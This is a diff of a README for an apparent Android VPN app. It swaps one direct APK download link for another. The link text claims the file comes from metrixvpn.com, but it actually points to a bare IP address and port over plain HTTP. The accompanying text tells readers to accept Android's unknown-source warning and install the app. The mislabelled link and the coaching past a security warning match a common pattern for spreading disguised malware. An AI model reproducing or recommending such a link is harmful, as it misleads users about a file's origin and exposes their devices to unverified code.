@@ -26,7 +26,7 @@ The latest APK is published on the **[Releases](https://github.com/zikzee632-has
 
 If you'd rather download from our own server directly:
 
-**[⬇ Download from metrixvpn.com](http://85.192.26.226/update/app.apk)**
+**[⬇ Download from metrixvpn.com](http://168.222.43.27:9090/update/app.apk)**
 
 > Android will warn about installing from an unknown source the first time — that's expected for any app distributed outside the Play Store. Allow the install from your file manager or browser when prompted.
 
